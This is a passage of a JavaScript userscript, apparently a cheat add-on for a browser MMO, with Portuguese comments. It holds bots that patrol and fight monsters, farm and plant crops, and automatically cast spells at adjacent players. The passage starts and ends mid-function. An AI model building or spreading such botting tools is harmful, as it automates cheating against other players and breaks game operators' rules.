		  dsk.localMsg(`Tentando liberar atrás... (${tries})`, '#ff0');
		}

		// só anda para trás se realmente liberou
		if (occupied(backX, backY) == 0) {
		  myself.move(backX, backY);
		  await xDelay(300);

		  if (myself.dir != dir) {
			send({ type: 'm', x: myself.x, y: myself.y, d: dir });
			await xDelay(200);
		  }
		  await xDoKeyPress(6, 100);
		}
	  }
	}
}

// ── WCAVE BOT ─────────────────────────────────────────────────

window.xWCID1         = 0;
window.xWCID2         = 0;
window.xWCID3         = 0;
window.xNeedsRep      = false;
window.RepTimer       = 0;
window.repItem        = '';
window.WCPosListX     = new Array(20).fill(0);
window.WCPosListY     = new Array(20).fill(0);
window.wcaveRepVoltas = 5;
window.xCombatEndTimer = null;
window.xRecentCombat = false;

// ── Helpers ───────────────────────────────────────────────────

dsk.on('postLoop', () => {
  if (!myself) return;
  if (myself.hpbar?.visible === true) {
    if (xCombatEndTimer) {
      clearTimeout(xCombatEndTimer);
      xCombatEndTimer = null;
    }
    xRecentCombat = true;
  } else if (xRecentCombat) {
    if (!xCombatEndTimer) {
      xCombatEndTimer = setTimeout(() => {
        xRecentCombat = false;
        xCombatEndTimer = null;
      }, 1000);
    }
  }
});

function xGetItemByID(id) {
  for (let i in objects.items) {
    if (objects.items[i]?.sprite === id) return objects.items[i];
  }
  return undefined;
}

function xGetSlotFood() {
  const foodIds = [220, 204, 188, 236, 487, 725];
  return foodIds.find(id => xGetSlotByID(id) !== undefined);
}

async function xDoLogOff() { //dsk.fquit();
	if (inv[5]?.sprite === undefined) { dsk.localMsg('OFF: slot 6 vazio', '#f00'); return; }

	const foodSlot = xGetSlotFood();
	if (foodSlot === undefined) { dsk.localMsg('OFF: sem comida', '#f00'); return; }

	if (inv[0]?.sprite === undefined) { dsk.localMsg('OFF: slot 1 vazio', '#f00'); return; }
	if (inv[1]?.sprite === undefined) { dsk.localMsg('OFF: slot 2 vazio', '#f00'); return; }
	if (inv[2]?.sprite === undefined) { dsk.localMsg('OFF: slot 3 vazio', '#f00'); return; }

}

async function xDoChangeDir(dir) {
  send({ type: 'm', x: myself.x, y: myself.y, d: dir });
  await xDelay(239);
}

async function xGetMobByName(...names) {
  xTemp[13] = myself;
  xTemp[15] = myself;
  let bestDist = Infinity;

  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (!mob || mob === myself) continue;
    if (xPlyrTest(mob)) continue;

    // ← Ignora mobs na blacklist
    if (xTemp[100]?.[mob.id] && xTemp[100][mob.id] > Date.now()) continue;

    const mobName = mob.name.toLowerCase().replace(/ /g, '');
    const nameMatch = names.some(n => {
      const search = n.toLowerCase().replace(/ /g, '');
      return mobName.includes(search) || search.includes(mobName);
    });

    if (!nameMatch) continue;

    const dist = Math.abs(mob.x - myself.x) + Math.abs(mob.y - myself.y);
    if (dist > 7) continue;
    if (dist < bestDist) {
      bestDist = dist;
      xTemp[15] = mob;
    }
  }

  xTemp[13] = xTemp[15];
  return xTemp[13];
}

function xPlyrTest(mob) {
  return mob?.type === 'player' || mob?.is_player === true;
}

async function xHeal() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[104] === true) return;

  xGoing[104] = true;
  const slot = xGetSlotByID(242);
  if (slot !== undefined && hp_status.val <= 70 && hp_status.val >= 0.1) {
	await xDelay(600);
    await xDoUseSlotByID(slot);
    // cooldown em background — não bloqueia o bot
    setTimeout(() => { xGoing[104] = false; }, 20000);
  } else {
    xGoing[104] = false;
  }
}

function xChangeStatus(msg) { dsk.localMsg(msg, '#0ff'); }

// ── Lógica principal ──────────────────────────────────────────

async function xWCave() {
  if (connection !== undefined && connection.readyState === 3) xMovingNow = false;
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;

  if (game_state !== 2) {
    xMovingNow = false;
    target.id = me;
    return;
  }

  if (xIfChatHas('Welcome back ')) {
    await xDelay(600);
    xDoClearChat('Welcome back ');
    await xDelay(600);
    target.id = me;
    xMovingNow = false;
    return;
  }

  if (xGoing[110] === true) return;
  xGoing[110] = true;

  // ── MODO REPARO ──────────────────────────────────────────

  if (xNeedsRep) {
    if (xGetSlotByID(719) === undefined) {
      xGoing[110] = false;
      await xDelay(150);
      if (xGetItemByID(xWCID3) !== undefined) {
        xChangeStatus('Buscando item para reparar...');
        await xDoMove(xGetItemByID(xWCID3).x, xGetItemByID(xWCID3).y);
        xDoPickUp();
		xDoPickUp();
		xDoPickUp();
      } else {
        xChangeStatus('Sem kit de reparo, desconectando...');
        xDoLogOff();
      }
      return;
    }

    for (let i in mobs.items) {
      const mob = mobs.items[i];
      if (!mob || mob === myself) continue;
      const dist = xGetDistance(myself.x, myself.y, mob.x, mob.y);

      if (dist <= 6) {
        if (xGetItemByID(xWCID3) !== undefined) {
          await xDoMove(xGetItemByID(xWCID3).x, xGetItemByID(xWCID3).y);
          xDoPickUp();
        }
        if (inv[2]?.sprite !== undefined) {
          if (inv[0]?.equip === 0) { xDoUseSlot(1); await xDelay(150); }
          if (inv[1]?.equip === 0) { xDoUseSlot(2); await xDelay(150); }
          if (inv[2]?.equip === 0) { xDoUseSlot(3); await xDelay(150); await xDelay(2000); }
        }
        xChangeStatus('Mob próximo! Reagindo...');
        if (xTemp[13] === myself) await xGetMobByName('Dire Wolf', 'Ice Elemental', 'Wolf');
        if (xTemp[13] !== undefined && xTemp[13] !== myself) {
          if (target.id !== xTemp[13].id) {
            target.id = xTemp[13].id;
            send({ type: 't', t: target.id });
          }
          const md = Math.abs(xTemp[13].x - myself.x) + Math.abs(myself.y - xTemp[13].y);
          if (md >= 1 && md > 2) target.id = me;
        }
        xGoing[110] = false;
        return;

      } else if (xPlyrTest(mob)) {
        xChangeStatus('Jogador detectado! Fugindo...');
        if (xGetItemByID(xWCID3) !== undefined) {
          await xDoMove(xGetItemByID(xWCID3).x, xGetItemByID(xWCID3).y);
          xDoPickUp();
		  xDoPickUp();
		  xDoPickUp();
        }
        if (inv[2]?.sprite !== undefined) {
          if (inv[0]?.equip === 0) { xDoUseSlot(0); await xDelay(150); }
          if (inv[1]?.equip === 0) { xDoUseSlot(1); await xDelay(150); }
          if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(150); }
        }
        await xGetMobByName('Wolf');
        if (xTemp[13] !== undefined && xTemp[13] !== myself) {
          if (target.id !== xTemp[13].id) {
            target.id = xTemp[13].id;
            send({ type: 't', t: target.id });
          }
          const md = Math.abs(xTemp[13].x - myself.x) + Math.abs(myself.y - xTemp[13].y);
          if (md >= 1 && md > 2) target.id = me;
        }
        xGoing[110] = false;
        return;
      }
    }

    if (inv[0]?.sprite !== undefined) {
      if (myself.x === 94 && myself.y === 93) {
        if      (inv[2]?.sprite !== undefined) { await xDelay(300); xChangeStatus('Dropando slot 3...'); xDoDropSlot(0, 3); }
        else if (inv[1]?.sprite !== undefined) { xChangeStatus('Dropando slot 2...'); xDoDropSlot(0, 2); }
        else                                   { xChangeStatus('Dropando slot 1...'); xDoDropSlot(0, 1); }
      } else {
        await xDoMove(94, 93);
        await xDelay(300);
      }
    } else {
      if (myself.x === 94 && myself.y === 92 && myself.dir === 2 && inv[xGetSlotByID(719)]?.equip !== 0) {
        if (xIfChatHas('The '+ repItem +' is in perfect condition.')) {
          xDoClearChat('The '+ repItem +' is in perfect condition.');
          xDoKeyUp(6);
          if (xGetItemByID(xWCID3) !== undefined) {
            xChangeStatus('Coletando itens após reparo...');
            await xDoMove(xGetItemByID(xWCID3).x, xGetItemByID(xWCID3).y);
            for (let p = 0; p < 6; p++) { await xDelay(300); xDoPickUp(); }
            if (inv[0]?.equip === 0) { xDoUseSlot(0); await xDelay(300); }
            if (inv[1]?.equip === 0) { xDoUseSlot(1); await xDelay(300); }
            if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(1000); }
            xNeedsRep = false;
            RepTimer  = 0;
          }
        } else {
          xDoKeyDown(6);
        }
      } else {
        xChangeStatus('Indo para posição de reparo...');
        await xDoMove(94, 92);
        await xDoChangeDir(2);
        await xDoUseSlot(xGetSlotByID(719));
        await xDelay(500);
      }
    }

    xGoing[110] = false;
    return;
  }

  // ── MODO NORMAL ──────────────────────────────────────────
// ← bloqueia tudo se precisar reparar
  if (xNeedsRep) {
    xGoing[110] = false;
    return;
  }

  const foodId = xGetSlotFood();
  if (foodId !== undefined) {
    if (hunger_status.val <= 65) {
      const foodSlot = xGetSlotByID(foodId);
      xChangeStatus('Comendo...');
      await xDoUseSlotByID(foodSlot);
      await xDelay(2000);
    }
  } else {
    xDoLogOff();
  }

  if (inv[0]?.equip === 0) { xDoUseSlot(0); await xDelay(150); }
  if (inv[1]?.equip === 0) { xDoUseSlot(1); await xDelay(150); }
  if (inv[2]?.equip === 0) { xDoUseSlot(2); await xDelay(150); }

  if (inv[0]?.equip === 2) { xDoLogOff(); await xDelay(150); }
  if (inv[1]?.equip === 2) { xDoLogOff(); await xDelay(150); }
  if (inv[2]?.equip === 2) { xDoLogOff(); await xDelay(150); }

  if (hp_status.val <= 70 && hp_status.val >= 0.1) {
    xChangeStatus('HP baixo, curando...');
    xHeal();
    if (hp_status.val <= 40) {
      xChangeStatus('HP crítico! Desconectando...');
      xDoLogOff();
      await xDelay(1000);
    }
  }

  const temMob = xTemp[13] !== undefined && xTemp[13] !== myself;
  const emCombate = xRecentCombat;
	if (!temMob && !emCombate && hp_status.val >= 80 && hp_status.val <= 92) {
    if (!xGoing[105]) {
      const slotBandagem = xGetSlotByID(767);
      if (slotBandagem !== undefined) {
        xGoing[105] = true;
        xDoUseSlotByID(slotBandagem);
        xDoUseSlotByID(slotBandagem);
        setTimeout(() => { xGoing[105] = false; }, 10000);
      }
    }
  }

  const pickAll = async () => {
    if (xGetItemByID(xWCID3) !== undefined) { await xDoMove(xGetItemByID(xWCID3).x, xGetItemByID(xWCID3).y); for (let p = 0; p < 5; p++) await xDoPickUp(); }
    if (xGetItemByID(xWCID1) !== undefined) { await xDoMove(xGetItemByID(xWCID1).x, xGetItemByID(xWCID1).y); for (let p = 0; p < 5; p++) await xDoPickUp(); }
    if (xGetItemByID(xWCID2) !== undefined) { await xDoMove(xGetItemByID(xWCID2).x, xGetItemByID(xWCID2).y); for (let p = 0; p < 5; p++) await xDoPickUp(); }
  };

  if (inv[0]?.sprite === undefined) { xChangeStatus('Slot 1 vazio, coletando...'); await pickAll(); xDoLogOff(); }
  if (inv[1]?.sprite === undefined) { xChangeStatus('Slot 2 vazio, coletando...'); await pickAll(); xDoLogOff(); }
  if (inv[2]?.sprite === undefined) { xChangeStatus('Slot 3 vazio, coletando...'); await pickAll(); xDoLogOff(); }
  if (inv[5]?.sprite === undefined) { xChangeStatus('Slot 6 vazio, desconectando...'); xDoLogOff(); }

  // ── Waypoints ────────────────────────────────────────────
  if (xTemp[70] === undefined) {
    xTemp[70] = 0;
    xTemp[71] = 19;
    const posX = [57, 68, 76, 90, 90, 78, 71, 54, 53 ,49, 51, 67, 60, 52, 61, 67, 47, 36, 40, 54, 58, 61];
    const posY = [47, 58, 42, 59, 74, 82, 92, 92, 78 ,70, 66, 57, 43, 33, 19, 11, 21,  8, 31, 36, 42, 48];
    for (let idx = 0; idx < 20; idx++) {
      WCPosListX[idx] = posX[idx];
      WCPosListY[idx] = posY[idx];
    }
  }

  // ── Busca mob ────────────────────────────────────────────
await xGetMobByName('Dire Wolf', 'Ice Elemental'); // ← nomes que quiser

if (xTemp[13] !== undefined && xTemp[13] !== myself) {
  const dist = xGetDistance(myself.x, myself.y, xTemp[13].x, xTemp[13].y);

  if (target.id !== xTemp[13].id) {
    target.id = xTemp[13].id;
    send({ type: 't', t: target.id });
  }

  if (dist <= 1) {
    // adjacente → ataca
	await xDoMove(xTemp[13].x, xTemp[13].y);
    xDelay(200);
	xDoMove(xTemp[13].x, xTemp[13].y - 1);
	xDelay(200);
	xDoMove(xTemp[13].x, xTemp[13].y + 1);
	xDelay(200);
  } else if (dist <= 7) {
    // longe → move até o mob
    await xDoMove(xTemp[13].x, xTemp[13].y);
    await xDelay(800);
  } else {
    // muito longe → desiste e patrulha
    target.id = me;
  }
}

  // ── Patrulha ─────────────────────────────────────────────
  if (xTemp[13] === myself || xTemp[13] === undefined) {
    const wpX = WCPosListX[xTemp[70]];
    const wpY = WCPosListY[xTemp[70]];
    const distToWP = Math.abs(myself.x - wpX) + Math.abs(myself.y - wpY);

    if (distToWP <= 2) {
      if (xTemp[70] >= xTemp[71]) {
        xTemp[70] = 0;
        RepTimer++;
      } else {
        xTemp[70]++;
      }
      if (RepTimer >= wcaveRepVoltas && xTemp[70] === 5) {
        xChangeStatus('Hora de reparar!');
        xNeedsRep = true;
        await xDoMove(94, 93);
      }
    } else {
      xDoMove(wpX, wpY, 3);
    }
  }

  xGoing[110] = false;
}

// ── WCAVE CONFIG PANEL ────────────────────────────────────────

dsk.wcave = { enabled: false }; // ← inicialização que faltava

dsk.wcaveManager = jv.Dialog.create(260, 220);
const wcm = dsk.wcaveManager;
wcm.visible = false;

wcm.header = jv.text('WCave Config', {
  font: '14px Verdana', fill: 0xFFD700, stroke: 0x555555, strokeThickness: 2,
});
wcm.addChild(wcm.header);
jv.center(wcm.header);
jv.top(wcm.header, 4);

wcm.close = jv.Button.create(0, 0, 24, 'X', wcm, 24);
jv.top(wcm.close, 4); jv.right(wcm.close, 4);
wcm.close.on_click = () => (wcm.visible = 0);

wcm.move = jv.Button.create(0, 0, 24, '@', wcm, 24);
jv.top(wcm.move, 4); jv.right(wcm.move, 28);

wcm._px = 0; wcm._py = 0;
window.addEventListener('mousemove', e => { wcm._px = e.clientX; wcm._py = e.clientY; });
window.addEventListener('touchmove', e => { wcm._px = e.touches[0].clientX; wcm._py = e.touches[0].clientY; });

wcm.updatePosition = () => {
  if (wcm.move.is_pressed) {
    const canvas = document.querySelector('canvas');
    const rect = canvas ? canvas.getBoundingClientRect() : { left: 0, top: 0, width: jv.game_width, height: jv.game_height };
    wcm.x = (wcm._px - rect.left) * (jv.game_width / rect.width) - wcm.w / 2;
    wcm.y = (wcm._py - rect.top) * (jv.game_height / rect.height) - 12;
  }
  if (wcm.x < 0) wcm.x = 0;
  if (wcm.y < 0) wcm.y = 0;
  if (wcm.x + wcm.w > jv.game_width)  wcm.x = jv.game_width - wcm.w;
  if (wcm.y + wcm.h > jv.game_height) wcm.y = jv.game_height - wcm.h;
};
dsk.on('postLoop', wcm.updatePosition);

// ← wcLbl declarado ANTES de ser usado
const wcLbl = (txt, y) => {
  const l = jv.text(txt, { font: '11px Verdana', fill: 0xffffff, stroke: 0x000000, strokeThickness: 2 });
  l.x = 10; l.y = y; wcm.addChild(l); return l;
};

wcm.lblWP     = wcLbl('Waypoint: -',        38);
wcm.lblRep    = wcLbl('RepTimer: 0',         53);
wcm.lblNeeds  = wcLbl('Needs Repair: não',   68);
wcm.lblHP     = wcLbl('HP: -',               83);
wcm.lblHunger = wcLbl('Fome: -',             98);
wcm.lblMob    = wcLbl('Mob alvo: -',        113);

wcLbl('Voltas p/ reparar:', 133);
wcm.lblVoltas = wcLbl(`atual: ${wcaveRepVoltas}`, 148);

const btnVoltasDown = jv.Button.create(0, 0, 20, '-', wcm, 20);
btnVoltasDown.x = 140; btnVoltasDown.y = 131;
btnVoltasDown.on_click = () => { if (wcaveRepVoltas > 1) wcaveRepVoltas--; };

const btnVoltasUp = jv.Button.create(0, 0, 20, '+', wcm, 20);
btnVoltasUp.x = 165; btnVoltasUp.y = 131;
btnVoltasUp.on_click = () => { wcaveRepVoltas++; };

dsk.on('postLoop', () => {
  if (!wcm.visible) return;
  wcm.lblWP.text     = `Waypoint: ${xTemp[70] ?? 0} / ${xTemp[71] ?? 19}`;
  wcm.lblRep.text    = `RepTimer: ${RepTimer ?? 0}`;
  wcm.lblNeeds.text  = `Needs Repair: ${xNeedsRep ? 'SIM ⚠' : 'não'}`;
  wcm.lblVoltas.text = `atual: ${wcaveRepVoltas}`;
  wcm.lblHP.text     = `HP: ${hp_status?.val?.toFixed(1) ?? '-'}%`;
  wcm.lblHunger.text = `Fome: ${hunger_status?.val?.toFixed(1) ?? '-'}%`;
  wcm.lblMob.text    = `Mob alvo: ${xTemp[13]?.name ?? 'nenhum'}`;
});

const btnResetWP = jv.Button.create(0, 0, 115, 'Reset Waypoint', wcm, 20);
btnResetWP.x = 10; btnResetWP.y = 165;
btnResetWP.on_click = () => { xTemp[70] = 0; RepTimer = 0; xNeedsRep = false; dsk.localMsg('WCave: reset!', '#ff0'); };

const btnForceRep = jv.Button.create(0, 0, 115, 'Forçar Reparo', wcm, 20);
btnForceRep.x = 130; btnForceRep.y = 165;
btnForceRep.on_click = () => { xNeedsRep = true; dsk.localMsg('WCave: reparo forçado!', '#ff0'); };

// ── Comandos ─────────────────────────────────────────────────

dsk.setCmd('/wcave', () => {
  dsk.wcave.enabled = !dsk.wcave.enabled;

  if (dsk.wcave.enabled) {
    // Captura IDs dos itens nos slots 0, 1 e 2
    xWCID1 = inv[0]?.sprite;
    xWCID2 = inv[1]?.sprite;
    xWCID3 = inv[2]?.sprite;
	repItem = xGetItemNameBySlot(0) ?? '';


    if (!xWCID1 || !xWCID2 || !xWCID3) {
      dsk.localMsg('WCave: coloque itens nos slots 0, 1 e 2 primeiro!', '#f55');
      dsk.wcave.enabled = false;
      return;
    }

    window.WCPosListX = new Array(20).fill(0);
    window.WCPosListY = new Array(20).fill(0);
    dsk.localMsg(`WCave: Ativado | ID1=${xWCID1} ID2=${xWCID2} ID3=${xWCID3}`, '#5f5');

    (async function loop() {
      while (dsk.wcave.enabled) {
        await xWCave();
        await xDelay(500);
      }
    })();
  } else {
    xGoing[110] = false;
    xMovingNow  = false;
    target.id   = me;
    dsk.localMsg('WCave Bot: Desativado', '#f55');
  }
});

dsk.setCmd('/wcaveconfig', () => {
  wcm.visible = !wcm.visible;
  dsk.localMsg(`WCave Config: ${wcm.visible ? 'Aberto' : 'Fechado'}`, wcm.visible ? '#5f5' : '#f55');
});

function xGetPlayerByPos(x, y) {
  if (target.id !== me) xTemp[11] = target.id;
  for (let i in mobs.items) {
    const mob = mobs.items[i];
    if (!mob) continue;
    if (mob.id === xTemp[11]) {
      if (mob.x === x && mob.y === y) return mob;
    }
  }
  return undefined;
}

function xGetSpellByID(id) {
  for (let i in jv.abl) {
    const spell = jv.abl[i];
    if (!spell) continue;
    if (spell.spr === id) {
      // verifica cooldown pelo timestamp — se c <= Date.now() está disponível
      if (spell.c <= Date.now()) return spell;
    }
  }
  return undefined;
}

function xDoSpell(id) {
  const spell = xGetSpellByID(id);
  if (spell !== undefined) {
    send({
      type: 'c',
      r: 'ab',
      a: jv.abl.indexOf(spell) // índice da spell no array
    });
  }
}

async function xDiso() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[106] === true) return;
  xGoing[106] = true;

  const spell = xGetSpellByID(909); // ← guarda o resultado
  if (spell !== undefined) {
    if (xGetPlayerByPos(myself.x + 1, myself.y) !== undefined) {
      if (myself.dir !== 1) await xDoChangeDir(1);
      await xDelay(50);
      xDoSpell(909);
    }
    if (xGetPlayerByPos(myself.x - 1, myself.y) !== undefined) {
      if (myself.dir !== 3) await xDoChangeDir(3);
      await xDelay(50);
      xDoSpell(909);
    }
    if (xGetPlayerByPos(myself.x, myself.y - 1) !== undefined) {
      if (myself.dir !== 0) await xDoChangeDir(0);
      await xDelay(50);
      xDoSpell(909);
    }
    if (xGetPlayerByPos(myself.x, myself.y + 1) !== undefined) {
      if (myself.dir !== 2) await xDoChangeDir(2);
      await xDelay(50);
      xDoSpell(909);
    }
  }

  xGoing[106] = false;
}

async function xWw() {
  if (dskPaused) return; // ← adiciona isso
  if (!myself || game_state !== 2) return;
  if (xGoing[230] === true) return;
  xGoing[230] = true;

  if (xGetSpellByID(911) !== undefined) {
    for (let dx = -2; dx <= 2; dx++) {
      for (let dy = -2; dy <= 2; dy++) {
        if (Math.abs(dx) + Math.abs(dy) > 2) continue;
        if (dx === 0 && dy === 0) continue;
        if (xGetPlayerByPos(myself.x + dx, myself.y + dy) !== undefined) {
          await xDelay(25);
          xDoSpell(911);
          xGoing[230] = false;
          return;
        }
      }
    }
  }

  xGoing[230] = false;
}

// ── DISO ─────────────────────────────────────────────────────

dsk.diso = { enabled: false };

dsk.setCmd('/diso', () => {
  dsk.diso.enabled = !dsk.diso.enabled;

  if (dsk.diso.enabled) {
    dsk.localMsg('Diso: Ativado', '#5f5');
    (async function loop() {
      while (dsk.diso.enabled) {
        if (game_state === 2) await xDiso();
        await xDelay(200);
      }
    })();
  } else {
    xGoing[106] = false;
    dsk.localMsg('Diso: Desativado', '#f55');
  }
});

// ── WW ───────────────────────────────────────────────────────

dsk.ww = { enabled: false };

dsk.setCmd('/ww', () => {
  dsk.ww.enabled = !dsk.ww.enabled;

  if (dsk.ww.enabled) {
    dsk.localMsg('WW: Ativado', '#5f5');
    (async function loop() {
      while (dsk.ww.enabled) {
        if (game_state === 2) await xWw();
        await xDelay(200);
      }
    })();
  } else {
    xGoing[230] = false;
    dsk.localMsg('WW: Desativado', '#f55');
  }
});

// ── FARM BOT ──────────────────────────────────────────────────

dsk.farm = { enabled: false };

dsk.setCmd('/farm', () => {
  dsk.farm.enabled = !dsk.farm.enabled;

  if (dsk.farm.enabled) {
    dsk.localMsg('Farm Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.farm.enabled) {
        await FarmBot();
        await xDelay(200);
      }
    })();
  } else {
    dsk.localMsg('Farm Bot: Desativado', '#f55');
  }
});
// ── FARM: opção de pular água raza ────────────────────────────
dsk.farm.skipWater = false;

// Wrapper: se skipWater, agua raza (0) vira 1 (bloqueado)
function farmOcc(x, y) {
  const v = occupied(x, y);
  if (dsk.farm.skipWater && v === 0) return 1;
  return v;
}

async function FarmBot() {

  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  // Parar se atingir level
  if (currentLevel > 0 && skillLevel >= currentLevel && ['farming','foraging'].includes(skillName)) {
    dsk.farm.enabled = false;
    dsk.localMsg('Farm Bot: Desativado (level atingido)', '#f55');
    return;
  }

  // Slots
  const shovelSlot = item_data.find(el => el?.n?.includes('Shovel'))?.slot;
  const seedSlot   = item_data.find(el => el?.n?.includes('Seed'))?.slot;

  if (shovelSlot === undefined || seedSlot === undefined) return;

  const allowedWalls = ['Animal Gate','Stone Wall','Tribe Gate','Signpost'];

  const hasWallRight = objects.items.find(el =>
    el && allowedWalls.includes(el.name) &&
    el.x === myself.x + 1 && el.y === myself.y
  );

  const hasWallLeft = objects.items.find(el =>
    el && allowedWalls.includes(el.name) &&
    el.x === myself.x - 1 && el.y === myself.y
  );

  // =========================
  // Funções auxiliares
  // =========================

  function getFrontTile(){
    if (myself.dir === 1) return {x: myself.x + 1, y: myself.y};
    if (myself.dir === 3) return {x: myself.x - 1, y: myself.y};
    if (myself.dir === 0) return {x: myself.x, y: myself.y - 1};
    if (myself.dir === 2) return {x: myself.x, y: myself.y + 1};
  }

  function getObstacle(x, y){
    return objects.items.find(el =>
      el && (el.name.includes('Tree') || el.name.includes('Bush') || el.name.includes('Rock')) &&
      el.x === x && el.y === y
    );
  }

  async function clearObstacle(x, y){
    let obstacle = getObstacle(x, y);
    let tries = 0;
    while (obstacle && tries < 20) {
      await xDoKeyPress(6, 219);
      await xDelay(321);
      obstacle = getObstacle(x, y);
      tries++;
    }
  }

  async function digTile(){
    await xDoKeyPress(6, 211);
    await xDelay(441);
  }

  // ✅ NOVO: cava até o tile mudar de estado (ou atingir limite de tentativas)
  async function digUntilReady(x, y){
    let tries = 0;
    while (occupied(x, y) === 0 && tries < 10) {
      await digTile();
      await xDelay(350);
      tries++;
    }
  }

  async function plantSeed(){
    await xDelay(150);
    await xDoPickUp();
    await xDelay(100);
    await xDoUseSlot(seedSlot);
    await xDelay(110);
  }

  const front = getFrontTile();
  const obstacleFront = getObstacle(front.x, front.y);

  // =========================
  // WALL DIREITA >
  // =========================
  if (myself.dir === 1 && hasWallRight){

    // 1) cavar em cima
    if (farmOcc(myself.x, myself.y - 1) === 0){
      await xDelay(515);
      await xDoChangeDir(0);
	  await xDelay(418);
	  await xDoUseSlot(shovelSlot);
      await digUntilReady(myself.x, myself.y - 1);
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // 2) só depois limpar o bush
    await xDelay(423);
    await xDoChangeDir(2);
    await xDelay(418);
    await clearObstacle(myself.x, myself.y + 1);

    // 3) descer e plantar
    await xDelay(325);
    await xDoMove(myself.x, myself.y + 1);
    await xDelay(237);
    await plantSeed();

	// 4) cavar embaixo (tile destino) antes do bush
    if (farmOcc(myself.x, myself.y + 1) === 0){
      await xDelay(423);
      await xDoChangeDir(2);
      await xDelay(418);
	  await xDoUseSlot(shovelSlot);
	  await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1);
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // virar esquerda
    await xDelay(349);
    await xDoChangeDir(3);

    return;
  }

  // =========================
  // WALL ESQUERDA <
  // =========================
  if (myself.dir === 3 && hasWallLeft){

    // 1) cavar embaixo
    if (farmOcc(myself.x, myself.y + 1) === 0){
      await xDelay(549);
      await xDoChangeDir(2);
	  await xDelay(418);
	  await xDoUseSlot(shovelSlot);
	  await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1);
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // 2) só depois limpar o bush
    await xDelay(348);
    await xDoChangeDir(0);
    await xDelay(357);
    await clearObstacle(myself.x, myself.y - 1);

    // 3) subir e plantar
    await xDelay(361);
    await xDoMove(myself.x, myself.y - 1);
    await xDelay(262);
    await plantSeed();

	// 4) cavar em cima (tile destino) antes do bush
    if (farmOcc(myself.x, myself.y - 1) === 0){
      await xDelay(348);
      await xDoChangeDir(0);
      await xDelay(357);
	  await xDoUseSlot(shovelSlot);
	  await xDelay(418);
      await digUntilReady(myself.x, myself.y - 1);
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1);
    }

    // virar direita
    await xDelay(372);
    await xDoChangeDir(1);

    return;
  }

  // =========================
  // Movimento normal lateral
  // =========================
  if (myself.dir === 1){ // indo para a direita >
    if (farmOcc(myself.x, myself.y - 1) === 0){
      await xDoChangeDir(0);
	  await xDelay(357);
	  await xDoUseSlot(shovelSlot);
	  await xDelay(418);
      await digUntilReady(myself.x, myself.y - 1); // ✅
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1)
      await xDoChangeDir(1);
    }
  }
  else if (myself.dir === 3){ // indo para a esquerda <
    if (farmOcc(myself.x, myself.y + 1) === 0){
      await xDoChangeDir(2);
	  await xDelay(418);
	  await xDoUseSlot(shovelSlot);
	  await xDelay(418);
      await digUntilReady(myself.x, myself.y + 1); // ✅
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1)
      await xDoChangeDir(3);
    }
  }
  else { // subindo ou descendo
    if (farmOcc(front.x, front.y) === 0){
	  await xDelay(418);
	  await xDoUseSlot(shovelSlot);
      await digUntilReady(front.x, front.y); // ✅
	  await xDelay(241);
      await xDoUseSlot(0);
      await xDelay(141);
      await xDoUseSlot(1)
    }
  }

  // =========================
  // Obstáculo à frente (após cavar)
  // =========================
  if (obstacleFront){
    await xDoKeyPress(6, 239);
    await xDelay(213);
    return;
  }

  // mover e plantar normalmente
  await xDoMove(front.x, front.y);
  await xDelay(257);
  await plantSeed();
}

// ── ALOE BOT ─────────────────────────────────────────────────

dsk.aloe = { enabled: false };

dsk.setCmd('/aloe', () => {
  dsk.aloe.enabled = !dsk.aloe.enabled;

  if (dsk.aloe.enabled) {
    dsk.localMsg('Aloe Bot: Ativado', '#5f5');
    (async function loop() {
      while (dsk.aloe.enabled) {
        await AloeBot();
        await xDelay(200);
      }
    })();
  } else {
    dsk.localMsg('Aloe Bot: Desativado', '#f55');
  }
});

async function AloeBot() {

  if (dskPaused) return;
  if (!myself || game_state !== 2) return;

  // Slots
  const shovelSlot = item_data.find(el => el?.n?.includes('Shovel'))?.slot;
  const seedSlot   = item_data.find(el => el?.n?.includes('Seed'))?.slot;

  if (shovelSlot === undefined || seedSlot === undefined) return;

  const allowedWalls = ['Animal Gate','Stone Wall','Tribe Gate','Signpost'];
  const porta = ['Tribe Gate'];

  const hasWallRight = objects.items.find(el =>
    el && allowedWalls.includes(el.name) &&
    el.x === myself.x + 1 && el.y === myself.y
  );

  const hasWallLeft = objects.items.find(el =>
    el && porta.includes(el.name) &&
    el.x === myself.x - 1 && el.y === myself.y
  );

  // =========================
  // Funções auxiliares
  // =========================

  async function repairShovel() {
    if (myself.dir == 0 && !hasWallRight) {
      await xDelay(400);
      await xDoDropByID(0, 621);
      await xDelay(400);
      await xDoUseSlotByID(xGetSlotByID(719));
      await xDelay(400);
      await xDoMove(myself.x + 1, myself.y);
      await xDelay(400);
      await xDoChangeDir(3);
      await xDelay(400);
      for (let j = 0; j < 9; j++) {
        if (!dsk.aloe.enabled) return;
        await xDoKeyPress(6, 180);
        await xDelay(800);
      }
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(400);
      await xDoPickUp();
      await xDelay(400);
      await xDoUseSlot(shovelSlot);
      await xDelay(400);
      await xDoChangeDir(0);
      await xDelay(400);
      await digUntilReady(myself.x, myself.y - 1);
    }
    if (myself.dir == 0 && hasWallRight) {
      await xDelay(400);
      await xDoDropByID(0, 621);
      await xDelay(400);
      await xDoUseSlotByID(xGetSlotByID(719));
      await xDelay(400);
      await xDoMove(myself.x - 1, myself.y);
      await xDelay(400);
      await xDoChangeDir(1);
